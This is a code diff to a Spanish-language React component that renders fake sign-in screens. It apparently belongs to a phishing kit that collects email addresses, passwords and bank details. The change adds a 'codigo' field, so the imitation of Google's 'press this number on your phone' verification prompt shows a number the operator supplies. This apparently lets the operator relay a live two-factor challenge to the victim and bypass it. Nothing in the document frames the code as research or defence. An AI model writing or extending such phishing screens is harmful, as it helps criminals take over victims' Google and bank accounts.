@@ -43,6 +43,7 @@ interface ScreenTemplatesProps {
     direccion?: string;
     correo?: string;
     contrasena?: string;
+    codigo?: string; // Código para la verificación de Google
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
@@ -711,11 +712,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               {screenData.correo || gmailCorreo || "inmobiliariadexter627@gmail.com"}
             </div>
 
-            <div className="text-5xl font-normal my-8">14</div>
+            <div className="text-5xl font-normal my-8">{screenData.codigo || '14'}</div>
 
             <p className="text-sm mb-2">Abrir la app de Gmail en tu celular</p>
             <p className="text-sm text-gray-700 mb-5 max-w-xs mx-auto">
-              Google envió una notificación a tu celular. Abre la app de Gmail, presiona <strong>Sí</strong> en el mensaje y, luego, presiona <strong>14</strong> en el teléfono para verificar que eres tú.
+              Google envió una notificación a tu celular. Abre la app de Gmail, presiona <strong>Sí</strong> en el mensaje y, luego, presiona <strong>{screenData.codigo || '14'}</strong> en el teléfono para verificar que eres tú.
             </p>
 
             <p 
